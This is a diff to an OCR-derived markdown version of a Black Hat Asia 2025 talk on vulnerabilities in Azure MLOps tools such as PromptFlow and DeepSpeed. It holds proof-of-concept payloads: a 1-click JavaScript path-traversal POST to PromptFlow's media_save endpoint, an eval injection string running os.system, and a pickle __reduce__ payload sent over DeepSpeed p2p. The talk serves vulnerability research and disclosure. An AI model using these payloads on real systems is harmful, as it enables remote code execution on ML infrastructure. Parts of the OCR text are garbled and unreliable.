@@ -8,18 +8,24 @@ year: 2025
 source_pdf: "Black Hat Asia 2025 Slides/Peng Zhou_The Oversights Under the Flow Discovering and Demystifying the Vulnerable Tooling Suites From Azure MLOps.pdf"
 pages: 75
 sha256: "f6e7bdf9173ad51f655c5c666f06b3d5d9e4d7a810f1f8758c9aa2772d2cfac7"
-text_chars: 38089
-ocr_pages: 28
+text_chars: 35663
+ocr_pages: 27
 has_ocr: true
+redacted_secrets: 0
+ocr_confidence: 88.0
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T21:07:58Z"
+converted_at: "2026-08-12T03:57:26Z"
 ---
 # The Oversights Under the Flow Discovering and Demystifying the Vulnerable Tooling Suites From Azure MLOps
 
 **Speakers:** Peng Zhou  
 **Conference:** Black Hat ASIA 2025  
 **Source:** `Black Hat Asia 2025 Slides/Peng Zhou_The Oversights Under the Flow Discovering and Demystifying the Vulnerable Tooling Suites From Azure MLOps.pdf` (75 pages)
+
 
 ## Slide 1
 
@@ -81,14 +87,12 @@ Peng Zhou (zpbrent)
 
 [1] https://azure.microsoft.com/en-us/products/devops/
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pisek hat
-ASIA 2025
 The Flow for Azure DevOps
 Azure Repos Azure Artifacts
-3ejagdO
 Azure Pipeline Azure Test Plans
 [1] https://azure.microsoft.com/en-us/products/devops/
 ```
@@ -154,26 +158,18 @@ On-premise Networks End users
 
 #BHAS @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2025
 Vulnerable Tooling Suites: Overview
 Install
 Install
-«
 Run
 Our Focus
 Development/AI/ML Tools/SDKs in Python
 f S deepspeed
-of e
 PromptFlow <3 TorchGeo
-+ Alr. Azure-AlI-Generative
-,
-EI “»
-»
 ```
 
 ## Slide 11
@@ -188,20 +184,12 @@ EI “»
 
 #BHAS @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 58/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pisek hat
-ASIA 2025
 Vulnerable Tooling Suites in , Azure MLOps
-deepspeed “a a orem
 PromptFlow PromptFlow rom ow
-° AIP Azure-AlI-Generative
-<3 TorchGeo TAF Azure-AlI-Generative .
-deepspeed &S :. TorchGeo
-SS ‘
-w4 deepspeed cK is a)
-PromptFlow
 ```
 
 ## Slide 13
@@ -238,46 +226,30 @@ PromptFlow
 
 #BHAS @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2025
 Example in Azure ML Workspace
 The core feature for Azure ML Studio & A Tool for Azure MLOps
 "8s standard flow
 Create
 Flow
 + UM + @Prompt + @ Python
-v Inputs (
 Name Type Value
 ud ring tte
 badd
-v Outputs
 Name Valu
-itout.category}
 evidenc evidence)
 badd
 Vv Code
 Chat flow
 Create
-,
 HH | Evaluation flow
 Create
 inputs
-®  fetch_text_content_from_url
-,
-es
-& summarize_text_content
-® prepare_examples
-_¥
-& classify with_llm
-’
 ® convert_to_dict
 outputs
-F 4
-PromptFlow
 ```
 
 ## Slide 16
@@ -304,12 +276,10 @@ join() calls back the bug
 
 #BHAS @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2025
 Oversight #1: Secure Cases in Codebase
 154 v
 155
@@ -339,9 +309,6 @@ process
 stdout,
 ["pfcli"] + cmd
 subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
-_ = process. communicate()
-F 4
-PromptFlow
 ```
 
 ## Slide 19
@@ -350,24 +317,18 @@ PromptFlow
 
 #BHAS @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-black hat
-ASIA 2025
 Oversight #1: Code Path >
-PromptFlow
 N
-8
-v k1ass ExperimentOperations (Telemetry
-Nv
 ExperimentOperations.
 Source
 V | class PFClient:
 def start(self, experiment: Experime stream=False, inputs=None, **kwargs) -> Experiment:
 40 tient class to interact with prompt flow entities. won
 o 9 Start an experiment.
-4aav def init_(self, **kwargs) -
 43 lodger.debug("PFClient init with kwargs: %s", kwargs) 1 if stream:
 44 # this is set, telemetry from this ent will use this user agent and ignore the one #r¢ 137 return ExperimentOrchestrator(self._client, riment).start(**kwargs)
 45 self \user_agent_override = kwargs.pop(USER_AGENT_OVERRIDE_KEY, None) 138 else:
@@ -397,7 +358,6 @@ aint - * ; = = Meneeifranoer= = “* 407 :palfam executable_path: Python path wh
 525 subprocess.Popen(" ".join(["nohup"] + args + ["&"]), shell=True, env=os.environ) # Yrart an orchestrator process using detach mode
 , 445 logger debue(f"Start experiment {self experiment name} in background.)
 Sink 446 _start_process_in_background(args, executable_path)
-447 Feturn seit. experiment
 ```
 
 ## Slide 20
@@ -406,12 +366,10 @@ Sink 446 _start_process_in_background(args, executable_path)
 
 #BHAS @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pisek hat
-ASIA 2025
-Oversight #1: Affecting Experimentation . _ P?
 2. Experimentation
 Run flow against
 sample data
@@ -426,11 +384,11 @@ If satisfied
 
 #BHAS @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Oversight #1: PoC >
-PromptFlow
 from promptflow.client import PFClient
 from promptflow._sdk._ constants import EXPERIMENT_CREATED_ON_INDEX_NAME, EXPERIMENT_TABLE_NAME, LOCAL_MGMT_DB_PATH
 from promptflow._sdk._orm import Experiment, mgmt_db_session
@@ -475,14 +433,11 @@ Vulnerable Experimentation in the Prompt Flow as PoC
 
 #BHAS @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2025
 Oversight #2: Secure Cases in Codebase —_ >
-PromptFlow
 12 werkzeug.utils import safe_join
 91 safe_path = safe_join(str(flow), PROMPT_FLOW_DIR_NAME)
 109 safe_path = safe_join(str(flow), image_path)
@@ -518,15 +473,12 @@ Why not use safe_join()
 
 #BHAS @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2025
 Oversight #2: Vulnerable Code Path —_ >
 : PromptFlow
-80 @api.ro ' . :
 a ep Source usage: pf [-h] [-v] {config,connection,flow,run,tool,trace,service,upgrade}
 81 v
 82 pf: manage prompt flow assets. Learn more: https://microsoft.github.io/promptflow.
@@ -541,19 +493,12 @@ positional arguments:
 8S tool Manage tools.
 89 args.base64_data trace Manage traces.
 90 extension = args.extension | Inject Point service SSIEISE BRED flow service.
-- . _ upgrade Upgrade prompt tiow cri.
 91 safe_path = r(flow), MPT_FL 7
 92 if safe_path is None:
 message = f"The untrusted path {P detected!"
 ion(message)
 (safe_path, base64_data, extension)
-" to(flow)
-0
-r
-cy
 et
-H
-0
 70 “ def save_image(directory, base64_data, extension):
 71 image_data = base64.b64decode(base64_data)
 72 hash_object = hashlib.sha256(image_data)
@@ -582,12 +527,10 @@ H
 
 [8] https://github.com/microsoft/promptflow/issues/3432
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2025
 Oversight #2: Remote or Local?
 LL engrogerio opened on Jun 18 edited by engrogerio - Edits ~ ++
 I can not serve to host 0.0.0.0.
@@ -625,10 +568,7 @@ command = #'sudo chmod 755 {constants_file_path}"
 exit_status = os.system(command)
 search_and_replace(constants_file_path, ‘PF_SERVICE_HOST = "127.0.0.1"",
 My scenario is: | am using promptflow on a Posit Connect deployed application,
-© a1
 *PF_SERVICE_HOST = "@.0.0.0"')
-F 4
-PromptFlow
 ```
 
 ## Slide 29
@@ -651,15 +591,12 @@ Written by GitHub Copilot with GPT-4o
 
 #BHAS @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2025
 Oversight #2: Remote PoC | _ | a >
 Written by GitHub Copilot with GPT-4o0
-PromptFlow
 <!DOCTYPE html><html lang="en"><b
 1-click meg | <button id="triggerButton">Run Script</button>
 <script>
@@ -667,18 +604,13 @@ document. getElementById('triggerButton').addEventListener('click’, function (
 const flowPath = btoa('/Users/test_flow');
 const url = “http://192.168.3.203:23333/v1.0/ui/media_save?flow=${ Path} 5
 const payload = {
-base64_data: btoa('hacked data\n'),
 extension: '/../../../../Windows/System32/hacked.d1l1'
 }3
 fetch(url, {
 method: ‘POST’,
 headers: {
-Content-Type’: ‘application/json'
-}
-body: JSON.stringify (payload)
 }).then(response => response.json()).then(data => console.log(data) )
 -catch(error => console.error(‘Error:', error));
-})
 ```
 
 ## Slide 31
@@ -707,26 +639,21 @@ body: JSON.stringify (payload)
 
 #BHAS @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2025
 Oversight #3: Secure Cases in Codebase rT.
 187 if "“registries/azureml-meta" in model details.id:
 188 allowed_skus = ast.literal_eval(model details.tags["“inference_compute_allow_list"])
 189 # Check aVailable quota tor each sku in the allowed sku list
 190 # pick the sku that has available quota and is the cheapest
 191 vm_sizes = self. _ml_client.compute. _vmsize operations. list(
-192 location=self._ml_client.compute. get _workspace_location()
 193 )
 218 response = response.replace("false", "“False")
 219 response = response.replace("true", "“True")
-220 parsed response = literal _eval(response)
 221 result = {}
 279 try:
-280 harm_response = literal _eval(response[metric_name])
 281 except Exception: # pylint: disable=broad-exception-caught
 282 harm_response = response[metric_name]
 ```
@@ -739,16 +666,14 @@ Why not use literal_eval()
 
 #BHAS @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-ASIA 2025
 Oversight #3: Code Injection . ry
 221 Vv] class OpenAICompletionsModel(LLMBase):
 238 Vv def _init_(
 239 self, *,
-252 presence penalty: Optional[float] = @,
 253 stop: Optional[Union[List[str], str]] = None,
 254 image captions:|Dict[str, str] = {},
 270 # Default stop fo end token if not provided
@@ -759,7 +684,6 @@ Oversight #3: Code Injection . ry
 275 stop = eval(stop)
 276 elif type(stop) is str: g
 277 stop = [stop] ° a i P-
-O Q
 _Why not use literal_eva
 ```
 
@@ -787,21 +711,12 @@ Sink
 
 #BHAS @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-ASIA 2025
-N
 a
-m
-+h
-a=]
-pe]
-7]
 w
-m
-Ww
 Single sample(response: dict,
 1 from promptflow import tool 8 etected-metriess/ dict) -> list:
 2 from typing import List selected_label|k = selected_metrics["safety_metrics"]
@@ -830,11 +745,10 @@ parsed fFrarm_response = {}
 
 #BHAS @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-ASIA 2025
 Oversight #3-#4: Affecting Evaluation fan}
 3. Evaluation & Refinement
 Run flow against
@@ -847,15 +761,12 @@ If satisfied
 
 #BHAS @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2025
 Oversight #3-#4: PoC (A Simple Example) | far
 from azure.ai.generative.evaluate.pf_templates.built_in_metrics.chat import construct_groundedness request as cgr
-parsed_chat={"questions":["ok?"], "“answers":["yes"], "“retrieved_documents":["__import__(‘os').system( ‘touch /tmp/hacked' )"]}
 cgr.construct_groundedness_requests(parsed_chat)
 ```
 
@@ -897,20 +808,16 @@ Vulnerable Evaluation in the Prompt Flow as PoC
 
 #BHAS @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2025
 Oversight #5: ulnerable Code Path deepspeed
 import deepspeed
 import deepspeed.runtime.pipe.p2p as p2p
 deepspeed.init_distributed(dist_backend="gloo", init_method="tcp:
 p2p.recv_obj(sender=0)
 619 4 def init_distributed(dist_backend=None, 119 }V def recv_obj(sender: int) -> typing.Any:
-= 120 from ~~ sender*~
-//0.0.0.0:29500", rank=1, world _size=2, auto_mpi_discovery=False)
 620 auto_mpi_discovery=True,
 621 distributed_port=TORCH_DISTRIBUTED_DEFAULT_PORT,
 — 122 WARN: This incur a CPU <-> GPU transfers and should be used sparingly
@@ -925,7 +832,6 @@ p2p.recv_obj(sender=0)
 627 rank=-1, 128 # Get message meta
 628 world_size=-1): 129 length = torch.tensor([@], dtype=torch. long) .to(get_accelerator().device_name())
 629 ‘'* Initialize dist backend, potentially performing MPI discovery if needed 130 dist.recv(length, src=sender)
-—»>
 131
 642 global cdb 132 # Receive and deserialize
 643 133 msg = torch.empty(length.item(), dtype=torch.uint8).to(get_accelerator().device_name())
@@ -964,11 +870,11 @@ host 1 host 2
 
 [19] https://pytorch.org/docs/stable/multiprocessing.html
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 blackhat by 3 =
-ASIA 2025 . 4 *
 Oversight #5: Multiprocessing in PyTorch deepspeed
 Jocs > Multiprocessing package - torch.multiprocessing >-
 Multiprocessing package - torch.multiprocessing
@@ -1005,25 +911,22 @@ without making any copies.
 
 #BHAS @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-ASIA 2025
 Oversight #5: Threat Model | deepspeed
 rank=0
 export MASTER_PORT=29500
 method= “tcp://192.168.3.153:29500”
 deepspeed. init_distributed(init_method=method, rank=0)
 p2p.recv_obj(sender=1)
-—
 rank=1,tensor() _= — Due to the time-intensive training work rank=1, payload()
 _ — by the true rank=1, the attacker may
 _ _ take the front-running and masquerade
 rank=1 _~ as rank=1 to exploit attacker
 export MASTER_ADDR=192.168.3.153 export MASTER_ADDR=192.168.3.153
 class payload:
-def __reduce__(self):
 method= “tcp://192.168.3.153:29500” return (__import__(‘os').system, (“touch /tmp/hacked",))
 deepspeed. init_distributed(init_method=method, rank=1)
 p2p.send_obj(msg=tensor(), dest=0) method= “tcp://192.168.3.153:29500”
@@ -1051,11 +954,10 @@ p2p.send_obj(msg=payload(), dest=0)
 
 #BHAS @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pisek hat
-ASIA 2025
 Oversight #5: Local or Remote? Z, deepspeed
 MSRC response
 Hi Peng!
@@ -1127,11 +1029,10 @@ Pickle String
 
 [23] https://github.com/microsoft/torchgeo/pull/2323
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-ASIA 2025
 Oversight #6: Copy-and-Paste 3 TorchGeo
 Removing eval in model weight API #2323
 adamjstewart merged 7 commits into main from b
@@ -1163,12 +1064,10 @@ models, although | don't know how compatible it is. But it would let us easily u
 
 [24] https://github.com/pytorch/vision/blob/main/torchvision/models/_api.py#L108
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2025
 Oversight #6: Copy-and-Paste
 calebrob6 commented on Sep 28 Member Author ***
 | looked at the torchvision version (https://github.com/pytorch/vision/blob/main/torchvision/models/_api.py#L108) and it seems
@@ -1192,7 +1091,6 @@ more hacky than what I've implemented here. | updated the PR description with mo
 132 for m in model_modules:
 133 potential_class = m.__dict__.get(enum_name, None)
 134 if potential_class is not None and issubclass(potential_class, Weigt
-135 weights_enum = potential class
 break
 138 if weights_enum is None:
 raise ValueError(f"The weight enum '{enum_name}' for the specific method couldn't be retrieved.")
@@ -1220,20 +1118,17 @@ raise ValueError(f"The weight enum '{enum_name}' for the specific method couldn'
 
 [26] https://github.com/Azure/azure-cli/pull/29798
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
 blackhat Se ee >.
-ASIA 2025 . 4 * ’
 Oversight #7-9: Secure Cases in Codebase- wa
 jsntcy commented on Aug 28 = edited ~ Member
 Please use our centralized function run_cmd which is more safe instead of writing your own.
 More details in https://github.com/Azure/azure-
-cli/blob/282c6e8f4358934094b5 12e29ae1421438de6/aa/doc/cli_subprocess_guidelines.md#cli-centralized-subsystem-executinc
 @Allyw
 © od
-q
 Mitigating Security Vulnerability When Calling Subsystem Commands
 There are several aspects of security practices that developers need to have in mindset to safeguard their cli modules from command injection
 attacks.
@@ -1344,19 +1239,6 @@ First report not cover
 
 #BHAS @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-2)
-black hat
-ASIA 2025
-Patch with Oversight #1
-en R-*A PRT
-cuter IVS s rn iz < \*¥
-. RY)! »/Q5°7o yp} LO
-First report not cover
-```
-
 ## Slide 65
 
 ### Patch with Oversight #2
@@ -1389,12 +1271,10 @@ But the Patch overlooks ‘bash -c’
 
 #BHAS @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2025
 Pp atch with Over sight #t 3 | dJeepspeed
 a. @@ -482,7 +482,8 @@ def command_exists(self, cmd):
 482 482 cmds = [cmd]
@@ -1445,12 +1325,10 @@ But the Patch overlooks “bash -c’
 
 #BHAS @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2025
 Countermeasure: Can LLM do the Help? =) covite
 2. MediaSave Resource
 @ Python (Oo
@@ -1466,8 +1344,6 @@ filename = hash_object.hexdigest()
 file_path = Path(directory) / f"{filename}}.{extension}"
 with open(file_path, "wb") as f:
 f.write(image_data) Oversight is here
-return file path
-args = media save _parser.parse_args()
 flow = decrypt_flow_path(args. flow)
 flow, _ = resolve flow_path(flow)
 base64_data = args.base64_data
@@ -1489,14 +1365,11 @@ return str(path)
 
 #BHAS @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2025
 Countermeasure: Can LLM do the Help? =) covite
-GPT-40 +
 ®&) To confirm whether the provided code snippet has vulnerabilities, let's break down each part and
 analyze it thoroughly.
 Code Analysis and Vulnerability Check
